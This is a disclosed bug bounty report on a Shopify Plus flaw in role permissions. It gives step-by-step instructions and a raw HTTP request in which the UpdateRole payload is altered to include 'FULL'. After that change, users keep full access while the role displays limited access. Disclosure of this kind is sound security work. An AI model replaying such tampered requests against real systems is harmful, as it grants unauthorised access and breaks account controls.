# [h1-2102] Break permissions waterfall

## Report Details
- **Report ID**: 1088159
- **URL**: https://hackerone.com/reports/1088159
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-01-26T22:03:05.194Z
- **Disclosed**: 2022-02-12T20:48:26.037Z

## Reporter
- **Username**: hogarth45
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
Shopify Plus User permission roles will propagate changes to all the users in the role
Its possible to break this 
If you pass FULL along with other Pemrissions into a user role edit
It will propagate to the users and give them full access while the role shows partial access

## Steps To Reproduce:

1. In Shopify Plus create a user role for a store and give it a handful of permissions
2. Apply the role to a user
3. Make a change to role and go back and you can see the change propagate to each of the users
This is true for adding permissions, taking away permissions, going Full access and back to Limited access

5. Go back to the role
6. Edit the permissions
7. Turn on HTTP proxy
8. Set Limited and select a few checkboxes
9. Save
10. Save
11. Catch the Saving request (keep in Repeater) and alter the permissions array to contain the string FULL

`"permissions":["DASHBOARD","ORDERS","GIFT_CARDS","FULL","REPORTS","OVERVIEWS"],`

12. Both Role and User account will reflect the FULL access
13. Alter the permissions array again with your Repeater request
Remove FULL for some garbage data

`"permissions":["DASHBOARD","ORDERS","GIFT_CARDS","cheese","REPORTS","OVERVIEWS"],`

14. The Role will show that all users have limited access, but users will retain FULL access

## Supporting Material/References:

```
POST /34937697/users/api HTTP/1.1
Host: shopify.plus
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
x-csrf-token: axogyrLP-YZ_UCyd_o8tdASj_uGTLc1wIT3c
x-plus-tracking: 28909bfe-8318-4a3a-bb66-d5a7643eca13, a2f06bd6-efaf-434c-a2be-13454e95417a, users
Origin: https://shopify.plus
Content-Length: 695
Connection: close
Cookie: ██████
X-h1-2102: hogarth45

{"operationName":"UpdateRole","variables":{"appHandles":[],"id":"Z2lkOi8vb3JnYW5pemF0aW9uL1JvbGUvNjc4Nw","name":"waterfall","shopAccess":[{"appPermissions":[],"permissions":["DASHBOARD","ORDERS","GIFT_CARDS","FULL","REPORTS","OVERVIEWS"],"shopId":"Z2lkOi8vb3JnYW5pemF0aW9uL1Nob3AvMzQ5NjYwMzM"}]},"query":"mutation UpdateRole($appHandles: [String!], $id: RoleID!, $name: String!, $shopAccess: [ShopAccessInput!]) {\n  updateRole(appHandles: $appHandles, id: $id, name: $name, shopAccess: $shopAccess) {\n    role {\n      id\n      name\n      __typename\n    }\n    userErrors {\n      message\n      field\n      __typename\n    }\n    message\n    operationStatus\n    __typename\n  }\n}\n"}
```

## Impact

users who should be limited by their role can have excessive permissions

## Attachments
No attachments
